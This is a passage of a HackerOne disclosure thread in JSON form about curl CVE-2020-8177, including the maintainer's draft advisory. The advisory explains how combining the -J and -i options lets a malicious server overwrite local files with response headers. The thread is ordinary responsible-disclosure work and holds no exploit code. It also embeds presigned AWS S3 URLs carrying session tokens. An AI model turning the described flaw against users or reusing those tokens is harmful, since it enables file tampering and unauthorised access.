026X-Amz-Date=20201229T070603Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDf7CC1janFXxWWF6QZ1Z6X6%2F6j0WDhv4gDyzEWu%2BScUAIhAOhgsmE64VangXFyIz5AGmDMLeT8sYG2vBQ4PwiaYS%2FZKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igy754oCq3nK3vWmRbMqkQM98qKdRlMDTd4bBwR4jJMppOWz7EU3ySwJK1geVZm7GvrSHyp8wAx03nVbAIisdh9q5SCYJs%2FJTXi%2Fsm9znfJcHgIy1DUYcyZol0zQmN4hQAlOUZZ6AJANKMjzew6Gbci4hpgZqkt7kMNinONmzU36EDiWMOc0y0LBIMMe8ckWdal2vM1amkx9g4%2B7jkxStLKe4Ry%2FVeqOEFeDj5B3%2Fim8atXFDPnaA6ZctYC0kADebiu9zFF1dQsSdkzsLG93dLAMR0ARXm0vun9nbqpp5oxDQafvSrdE7oDp0yem%2B391K5yvQ%2FVkTdyMd797ooD1IAYqUdwlX0lVblqv9ErzI2EUbOnFhO5widZFoU8s5JQDxyTzDlNAHHPnQpU8XD7uIRyR%2Bh43I9VvsEn1pERJ2rOM57I1PkAM8vesvdhiNkLY7KsmmB1q5drdmKxzSDeK5uPJY%2F7b6ZdCcYzDgNfX18d6h0A0FHbvXn7qPH9NQWGUsNXamCikRs9AA%2BK%2BzqwxI%2FlZdCdkUBJNbFqefOmuHA6y4DCuw6r%2FBTrqAZ4iBH5JOWBgJ5BPglFYT1gWFkwyMqq8gmMxb5SeS%2FjunuR9x9HhadmGfzTt7avXh7ra%2BbCbT8G5EBTHekw5tLrBpYwkzmLiedzIpJ4pJqrAXmk%2B6qfKdpUFGOfE%2FoOdzhIkM32hFOTOwwCcLwfUCOQXCXHweJlGlDZdV%2FgvnAv5llJv80AS6mRncqu5cTdZ6kwskL6mtLuZx022Hs9iVQEhZVcVFVxWNFIMlrPZufuNWFtnv13RkAoiqYOJgDn3UWRAP9lucn7OMZs0NyqKFy1iLho2FCO%2BegcGHVqDf%2FVxOtLAlnkhjmFRxg%3D%3D\u0026X-Amz-Signature=1268a0bf50733c60c31ff86d9361819377f06168b2de000a304b6a5fbfd4307b"},{"id":850213,"filename":"0001-tool_getparam-i-is-not-OK-if-J-is-used.patch","type":"text/x-patch","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uHtXBKjE6NddTaK38sfEV7Di?response-content-disposition=attachment%3B%20filename%3D%220001-tool_getparam-i-is-not-OK-if-J-is-used.patch%22%3B%20filename%2A%3DUTF-8%27%270001-tool_getparam-i-is-not-OK-if-J-is-used.patch\u0026response-content-type=text%2Fx-patch\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQW2BAZGD3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070603Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDf7CC1janFXxWWF6QZ1Z6X6%2F6j0WDhv4gDyzEWu%2BScUAIhAOhgsmE64VangXFyIz5AGmDMLeT8sYG2vBQ4PwiaYS%2FZKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igy754oCq3nK3vWmRbMqkQM98qKdRlMDTd4bBwR4jJMppOWz7EU3ySwJK1geVZm7GvrSHyp8wAx03nVbAIisdh9q5SCYJs%2FJTXi%2Fsm9znfJcHgIy1DUYcyZol0zQmN4hQAlOUZZ6AJANKMjzew6Gbci4hpgZqkt7kMNinONmzU36EDiWMOc0y0LBIMMe8ckWdal2vM1amkx9g4%2B7jkxStLKe4Ry%2FVeqOEFeDj5B3%2Fim8atXFDPnaA6ZctYC0kADebiu9zFF1dQsSdkzsLG93dLAMR0ARXm0vun9nbqpp5oxDQafvSrdE7oDp0yem%2B391K5yvQ%2FVkTdyMd797ooD1IAYqUdwlX0lVblqv9ErzI2EUbOnFhO5widZFoU8s5JQDxyTzDlNAHHPnQpU8XD7uIRyR%2Bh43I9VvsEn1pERJ2rOM57I1PkAM8vesvdhiNkLY7KsmmB1q5drdmKxzSDeK5uPJY%2F7b6ZdCcYzDgNfX18d6h0A0FHbvXn7qPH9NQWGUsNXamCikRs9AA%2BK%2BzqwxI%2FlZdCdkUBJNbFqefOmuHA6y4DCuw6r%2FBTrqAZ4iBH5JOWBgJ5BPglFYT1gWFkwyMqq8gmMxb5SeS%2FjunuR9x9HhadmGfzTt7avXh7ra%2BbCbT8G5EBTHekw5tLrBpYwkzmLiedzIpJ4pJqrAXmk%2B6qfKdpUFGOfE%2FoOdzhIkM32hFOTOwwCcLwfUCOQXCXHweJlGlDZdV%2FgvnAv5llJv80AS6mRncqu5cTdZ6kwskL6mtLuZx022Hs9iVQEhZVcVFVxWNFIMlrPZufuNWFtnv13RkAoiqYOJgDn3UWRAP9lucn7OMZs0NyqKFy1iLho2FCO%2BegcGHVqDf%2FVxOtLAlnkhjmFRxg%3D%3D\u0026X-Amz-Signature=036589d6e19963517326ad52361c82ce4a35f3b877cce8ebddba95b50ae30137"}],"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8163933,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Attached and inline below is my first advisory draft for this issue. I have not asked for a CVE yet but that's next in line.\n\n@snsn: please let us know how you want to be credited in this Security Advisory and elsewhere.\n\n\n-------\n\ncurl overwrite local file with -J\n=================================\n\nProject curl Security Advisory, June 24th 2020 -\n[Permalink](https://curl.haxx.se/docs/CVE-2020-JJJJ.html)\n\nVULNERABILITY\n-------------\n\ncurl can be tricked to overwrite a local file when using `-J`\n(`--remote-header-name`) and `-i` (`--head`) in the same command line.\n\nThe command line tool offers the `-J` option that saves a remove file using\nthe file name present in the `Content-Disposition:` response header. curl then\nrefuses to overwrite an existing local file using the same name, if one alredy\nexists in the current directly.\n\nThe `-J` flag is designed to save a response body, and so it doesn't work\ntogether with `-i` and there's logic that forbids it. However, the check is\nflawed and doesn't properly check for when the options are used in the\nreversed order: first using `-J` and then `-i` were mistakenly accepted.\n\nThe result of this mistake was that incoming HTTP headers could overwrite a\nlocal file if one existed, as the check to avoid the local file was done first\nwhen body data was received, and due to the mistake mentioned above, it could\nalready have received and saved headers by that time.\n\nThe saved file would only get response headers added to it, as it would abort\nthe saving when the first body byte arrives. A malicious server could however\nstill be made to send back virtually anything as headers and curl would save\nthem like this, until the first CRLF-CRLF sequence appears.\n\n(Also note that `-J` needs to be used in combination with `-O` to have any\neffect.)\n\nWe are not aware of any exploit of this flaw.\n\nINFO\n----\n\nUsers should be aware and *never* run curl with the `-J` option in their\n`$HOME` or other sensitive directories, independently of this flaw. Using curl\nthat way allows curl to create any file name it likes (ie what the remote\nserver suggests) and it can confuse or trick users if allowed to save files\nthat can mistakenly be assumed to be \"locally made\" or part of the system\nrather than provided by a potentially malicious remote party.\n\nThis bug was brought in commit\n[80675818e0417b](https://github.com/curl/curl/commit/80675818e0417b) when `-J`\nwas introduced to curl, first shipped in curl 7.20.0.\n\nThis flaw can happen to users of the curl tool but **not** for applications\nusing libcurl.\n\nThe Common Vulnerabilities and Exposures (CVE) project has assigned the name\nCVE-2020-JJJJ to this issue.\n\nCWE-641: Improper Restriction of Names for Files and Other Resources\n\nSeverity: 4.7 (Medium)\n\nAFFECTED VERSIONS\n-----------------\n\n- Affected versions: curl 7.20.0 to and including 7.70.0\n- Not affected versions: curl \u003c 7.20.0\n\nTHE SOLUTION\n------------\n\nA [fix for CVE-2020-JJJJ](link will follow)\n\nRECOMMENDATIONS\n--------------\n\nWe suggest you take one of the following actions immediately, in order of\npreference:\n\n A - Upgrade curl to version 7.71.0\n \n B - Apply the patch on your curl version and rebuild\n\n C - Do not use `-J` (in a directory with pre-existing files)\n \nTIMELINE\n--------\n\nThis issue was first reported to the curl project on May 30, 2020. \n\nThis advisory was posted on June 24th 2020.\n\nCREDITS\n-------\n\nThis issue was reported by sn on hackerone. Patched by Daniel Stenberg.\n\nThanks a lot!\n","markdown_message":"\u003cp\u003eAttached and inline below is my first advisory draft for this issue. I have not asked for a CVE yet but that\u0026#39;s next in line.\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/snsn\"\u003e@snsn\u003c/a\u003e: please let us know how you want to be credited in this Security Advisory and elsewhere.\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003ch1 id=\"curl-overwrite-local-file-with-j\"\u003ecurl overwrite local file with -J\u003c/h1\u003e\n\n\u003cp\u003eProject curl Security Advisory, June 24th 2020 -\u003cbr\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fcurl.haxx.se%2Fdocs%2FCVE-2020-JJJJ.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ePermalink\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"vulnerability\"\u003eVULNERABILITY\u003c/h2\u003e\n\n\u003cp\u003ecurl can be tricked to overwrite a local file when using \u003ccode\u003e-J\u003c/code\u003e\u003cbr\u003e\n(\u003ccode\u003e--remote-header-name\u003c/code\u003e) and \u003ccode\u003e-i\u003c/code\u003e (\u003ccode\u003e--head\u003c/code\u003e) in the same command line.\u003c/p\u003e\n\n\u003cp\u003eThe command line tool offers the \u003ccode\u003e-J\u003c/code\u003e option that saves a remove file using\u003cbr\u003e\nthe file name present in the \u003ccode\u003eContent-Disposition:\u003c/code\u003e response header. curl then\u003cbr\u003e\nrefuses to overwrite an existing local file using the same name, if one alredy\u003cbr\u003e\nexists in the current directly.\u003c/p\u003e\n\n\u003cp\u003eThe \u003ccode\u003e-J\u003c/code\u003e flag is designed to save a response body, and so it doesn\u0026#39;t work\u003cbr\u003e\ntogether with \u003ccode\u003e-i\u003c/code\u003e and there\u0026#39;s logic that forbids it. However, the check is\u003cbr\u003e\nflawed and doesn\u0026#39;t properly check for when the options are used in the\u003cbr\u003e\nreversed order: first using \u003ccode\u003e-J\u003c/code\u003e and then \u003ccode\u003e-i\u003c/code\u003e were mistakenly accepted.\u003c/p\u003e\n\n\u003cp\u003eThe result of this mistake was that incoming HTTP headers could overwrite a\u003cbr\u003e\nlocal file if one existed, as the check to avoid the local file was done first\u003cbr\u003e\nwhen body data was received, and due to the mistake mentioned above, it could\u003cbr\u003e\nalready have received and saved headers by that time.\u003c/p\u003e\n\n\u003cp\u003eThe saved file would only get response headers added to it, as it would abort\u003cbr\u003e\nthe saving when the first body byte arrives. A malicious server could however\u003cbr\u003e\nstill be made to send back virtually anything as headers and curl would save\u003cbr\u003e\nthem like this, until the first CRLF-CRLF sequence appears.\u003c/p\u003e\n\n\u003cp\u003e(Also note that \u003ccode\u003e-J\u003c/code\u003e needs to be used in combination with \u003ccode\u003e-O\u003c/code\u003e to have any\u003cbr\u003e\neffect.)\u003c/p\u003e\n\n\u003cp\u003eWe are not aware of any exploit of this flaw.\u003c/p\u003e\n\n\u003ch2 id=\"info\"\u003eINFO\u003c/h2\u003e\n\n\u003cp\u003eUsers should be aware and \u003cem\u003enever\u003c/em\u003e run curl with the \u003ccode\u003e-J\u003c/code\u003e option in their\u003cbr\u003e\n\u003ccode\u003e$HOME\u003c/code\u003e or other sensitive directories, independently of this flaw. Using curl\u003cbr\u003e\nthat way allows curl to create any file name it likes (ie what the remote\u003cbr\u003e\nserver suggests) and it can confuse or trick users if allowed to save files\u003cbr\u003e\nthat can mistakenly be assumed to be \u0026quot;locally made\u0026quot; or part of the system\u003cbr\u003e\nrather than provided by a potentially malicious remote party.\u003c/p\u003e\n\n\u003cp\u003eThis bug was brought in commit\u003cbr\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fcurl%2Fcurl%2Fcommit%2F80675818e0417b\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e80675818e0417b\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e when \u003ccode\u003e-J\u003c/code\u003e\u003cbr\u003e\nwas introduced to curl, first shipped in curl 7.20.0.\u003c/p\u003e\n\n\u003cp\u003eThis flaw can happen to users of the curl tool but \u003cstrong\u003enot\u003c/strong\u003e for applications\u003cbr\u003e\nusing libcurl.\u003c/p\u003e\n\n\u003cp\u003eThe Common Vulnerabilities and Exposures (CVE) project has assigned the name\u003cbr\u003e\nCVE-2020-JJJJ to this issue.\u003c/p\u003e\n\n\u003cp\u003eCWE-641: Improper Restriction of Names for Files and Other Resources\u003c/p\u003e\n\n\u003cp\u003eSeverity: 4.7 (Medium)\u003c/p\u003e\n\n\u003ch2 id=\"affected-versions\"\u003eAFFECTED VERSIONS\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eAffected versions: curl 7.20.0 to and including 7.70.0\u003c/li\u003e\n\u003cli\u003eNot affected versions: curl \u0026lt; 7.20.0\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"the-solution\"\u003eTHE SOLUTION\u003c/h2\u003e\n\n\u003cp\u003eA [fix for CVE-2020-JJJJ](link will follow)\u003c/p\u003e\n\n\u003ch2 id=\"recommendations\"\u003eRECOMMENDATIONS\u003c/h2\u003e\n\n\u003cp\u003eWe suggest you take one of the following actions immediately, in order of\u003cbr\u003e\npreference:\u003c/p\u003e\n\n\u003cp\u003eA - Upgrade curl to version 7.71.0\u003c/p\u003e\n\n\u003cp\u003eB - Apply the patch on your curl version and rebuild\u003c/p\u003e\n\n\u003cp\u003eC - Do not use \u003ccode\u003e-J\u003c/code\u003e (in a directory with pre-existing files)\u003c/p\u003e\n\n\u003ch2 id=\"timeline\"\u003eTIMELINE\u003c/h2\u003e\n\n\u003cp\u003eThis issue was first reported to the curl project on May 30, 2020. \u003c/p\u003e\n\n\u003cp\u003eThis advisory was posted on June 24th 2020.\u003c/p\u003e\n\n\u003ch2 id=\"credits\"\u003eCREDITS\u003c/h2\u003e\n\n\u003cp\u003eThis issue was reported by sn on hackerone. Patched by Daniel Stenberg.\u003c/p\u003e\n\n\u003cp\u003eThanks a lot!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-01T06:54:26.839Z","updated_at":"2020-06-01T06:54:26.839Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":850607,"filename":"CVE-2020-JJJJ.md","type":"text/markdown","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/o4Mh6AXMDPBswCAtwq8ERqu7?response-content-disposition=attachment%3B%20filename%3D%22CVE-2020-JJJJ.md%22%3B%20filename%2A%3DUTF-8%27%27CVE-2020-JJJJ.md\u0026response-content-type=text%2Fmarkdown\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQW2BAZGD3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070603Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDf7CC1janFXxWWF6QZ1Z6X6%2F6j0WDhv4gDyzEWu%2BScUAIhAOhgsmE64VangXFyIz5AGmDMLeT8sYG2vBQ4PwiaYS%2FZKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igy754oCq3nK3vWmRbMqkQM98qKdRlMDTd4bBwR4jJMppOWz7EU3ySwJK1geVZm7GvrSHyp8wAx03nVbAIisdh9q5SCYJs%2FJTXi%2Fsm9znfJcHgIy1DUYcyZol0zQmN4hQAlOUZZ6AJANKMjzew6Gbci4hpgZqkt7kMNinONmzU36EDiWMOc0y0LBIMMe8ckWdal2vM1amkx9g4%2B7jkxStLKe4Ry%2FVeqOEFeDj5B3%2Fim8atXFDPnaA6ZctYC0kADebiu9zFF1dQsSdkzsLG93dLAMR0ARXm0vun9nbqpp5oxDQafvSrdE7oDp0yem%2B391K5yvQ%2FVkTdyMd797ooD1IAYqUdwlX0lVblqv9ErzI2EUbOnFhO5widZFoU8s5JQDxyTzDlNAHHPnQpU8XD7uIRyR%2Bh43I9VvsEn1pERJ2rOM57I1PkAM8vesvdhiNkLY7KsmmB1q5drdmKxzSDeK5uPJY%2F7b6ZdCcYzDgNfX18d6h0A0FHbvXn7qPH9NQWGUsNXamCikRs9AA%2BK%2BzqwxI%2FlZdCdkUBJNbFqefOmuHA6y4DCuw6r%2FBTrqAZ4iBH5JOWBgJ5BPglFYT1gWFkwyMqq8gmMxb5SeS%2FjunuR9x9HhadmGfzTt7avXh7ra%2BbCbT8G5EBTHekw5tLrBpYwkzmLiedzIpJ4pJqrAXmk%2B6qfKdpUFGOfE%2FoOdzhIkM32hFOTOwwCcLwfUCOQXCXHweJlGlDZdV%2FgvnAv5llJv80AS6mRncqu5cTdZ6kwskL6mtLuZx022Hs9iVQEhZVcVFVxWNFIMlrPZufuNWFtnv13RkAoiqYOJgDn3UWRAP9lucn7OMZs0NyqKFy1iLho2FCO%2BegcGHVqDf%2FVxOtLAlnkhjmFRxg%3D%3D\u0026X-Amz-Signature=8e99c5b9289ae8bd9ed2129f8f43178d5cd3e470904b90c64ab71741af52234a"}],"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8164130,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-01T07:22:01.771Z","updated_at":"2020-06-01T07:22:01.771Z","additional_data":{"old_title":"Multiple logical bugs allow local file override without path traversal when using specific curl arguments","new_title":"curl overwrite local file with -J"},"actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8164231,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-01T07:40:24.171Z","updated_at":"2020-06-01T07:40:24.171Z","cve_ids":["CVE-2020-8177"],"actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8164284,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I believe the patch does fix it, however I wonder if the rename logic in `tool_cb_hdr.c` should just be removed? As far as I understand it can't be executed in any flow right now, and seems a bit risky since the `Content-disposition` logic generally does not overwrite existing files.\nThe advisory and credits looks good.\n\nThanks!","markdown_message":"\u003cp\u003eI believe the patch does fix it, however I wonder if the rename logic in \u003ccode\u003etool_cb_hdr.c\u003c/code\u003e should just be removed? As far as I understand it can\u0026#39;t be executed in any flow right now, and seems a bit risky since the \u003ccode\u003eContent-disposition\u003c/code\u003e logic generally does not overwrite existing files.\u003cbr\u003e\nThe advisory and credits looks good.\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-01T07:50:08.587Z","updated_at":"2020-06-01T07:50:08.587Z","actor":{"username":"snsn","cleared":false,"url":"/snsn","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8164752,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @snsn. You're right that the entire rename logic there seems superfluous. I'm attaching an updated patch that also removes that - all existing test cases (and the new 1460 one) still run OK.","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/snsn\"\u003e@snsn\u003c/a\u003e. You\u0026#39;re right that the entire rename logic there seems superfluous. I\u0026#39;m attaching an updated patch that also removes that - all existing test cases (and the new 1460 one) still run OK.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-01T08:46:21.374Z","updated_at":"2020-06-01T08:46:21.374Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":850730,"filename":"0001-tool_getparam-i-is-not-OK-if-J-is-used.patch","type":"text/x-patch","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/RcBg1X2hBTenkewvfXTiRKJm?response-content-disposition=attachment%3B%20filename%3D%220001-tool_getparam-i-is-not-OK-if-J-is-used.patch%22%3B%20filename%2A%3DUTF-8%27%270001-tool_getparam-i-is-not-OK-if-J-is-used.patch\u0026response-content-type=text%2Fx-patch\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQW2BAZGD3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070603Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDf7CC1janFXxWWF6QZ1Z6X6%2F6j0WDhv4gDyzEWu%2BScUAIhAOhgsmE64VangXFyIz5AGmDMLeT8sYG2vBQ4PwiaYS%2FZKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igy754oCq3nK3vWmRbMqkQM98qKdRlMDTd4bBwR4jJMppOWz7EU3ySwJK1geVZm7GvrSHyp8wAx03nVbAIisdh9q5SCYJs%2FJTXi%2Fsm9znfJcHgIy1DUYcyZol0zQmN4hQAlOUZZ6AJANKMjzew6Gbci4hpgZqkt7kMNinONmzU36EDiWMOc0y0LBIMMe8ckWdal2vM1amkx9g4%2B7jkxStLKe4Ry%2FVeqOEFeDj5B3%2Fim8atXFDPnaA6ZctYC0kADebiu9zFF1dQsSdkzsLG93dLAMR0ARXm0vun9nbqpp5oxDQafvSrdE7oDp0yem%2B391K5yvQ%2FVkTdyMd797ooD1IAYqUdwlX0lVblqv9ErzI2EUbOnFhO5widZFoU8s5JQDxyTzDlNAHHPnQpU8XD7uIRyR%2Bh43I9VvsEn1pERJ2rOM57I1PkAM8vesvdhiNkLY7KsmmB1q5drdmKxzSDeK5uPJY%2F7b6ZdCcYzDgNfX18d6h0A0FHbvXn7qPH9NQWGUsNXamCikRs9AA%2BK%2BzqwxI%2FlZdCdkUBJNbFqefOmuHA6y4DCuw6r%2FBTrqAZ4iBH5JOWBgJ5BPglFYT1gWFkwyMqq8gmMxb5SeS%2FjunuR9x9HhadmGfzTt7avXh7ra%2BbCbT8G5EBTHekw5tLrBpYwkzmLiedzIpJ4pJqrAXmk%2B6qfKdpUFGOfE%2FoOdzhIkM32hFOTOwwCcLwfUCOQXCXHweJlGlDZdV%2FgvnAv5llJv80AS6mRncqu5cTdZ6kwskL6mtLuZx022Hs9iVQEhZVcVFVxWNFIMlrPZufuNWFtnv13RkAoiqYOJgDn3UWRAP9lucn7OMZs0NyqKFy1iLho2FCO%2BegcGHVqDf%2FVxOtLAlnkhjmFRxg%3D%3D\u0026X-Amz-Signature=6d528a31a2dbfbae09f5d7d6173bbed22a0aaab13dcf9ecbd60dfaab812a74ee"}],"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8169655,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I believe `filename` is leaked, but other than that it looks ok.","markdown_message":"\u003cp\u003eI believe \u003ccode\u003efilename\u003c/code\u003e is leaked, but other than that it looks ok.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-01T16:10:48.632Z","updated_at":"2020-06-01T16:10:48.632Z","actor":{"username":"snsn","cleared":false,"url":"/snsn","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8172759,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e I  believe filename is leaked,\n\nThanks. Seems accurate, I'll fix!","markdown_message":"\u003cblockquote\u003e\n\u003cp\u003eI  believe filename is leaked,\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eThanks. Seems accurate, I\u0026#39;ll fix!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-01T21:42:14.720Z","updated_at":"2020-06-01T21:42:14.720Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8176072,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-02T08:51:27.358Z","updated_at":"2020-06-02T08:51:27.358Z","additional_data":{"old_severity":"Medium (6.1)","new_severity":"Medium (4.7)","old_severity_id":736666,"new_severity_id":738663},"actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8176075,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-02T08:51:40.786Z","updated_at":"2020-06-02T08:51:40.786Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8176096,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"The curl security team has decided to reward hacker @snsn  with the amount of 700 USD for finding and reporting this issue. Many thanks for your great work!","markdown_message":"\u003cp\u003eThe curl security team has decided to reward hacker \u003ca href=\"/snsn\"\u003e@snsn\u003c/a\u003e  with the amount of 700 USD for finding and reporting this issue. Many thanks for your great work!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-02T08:52:58.713Z","updated_at":"2020-06-02T08:52:58.713Z","actor":{"url":"/curl","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"curl"}},"bounty_amount":"700.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"curl","collaborator":{"username":"snsn","url":"/snsn"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8391882,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Published!","markdown_message":"\u003cp\u003ePublished!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-24T06:49:46.661Z","updated_at":"2020-06-24T06:49:46.661Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"snsn","url":"/snsn"},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9730784,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Let's disclose","markdown_message":"\u003cp\u003eLet\u0026#39;s 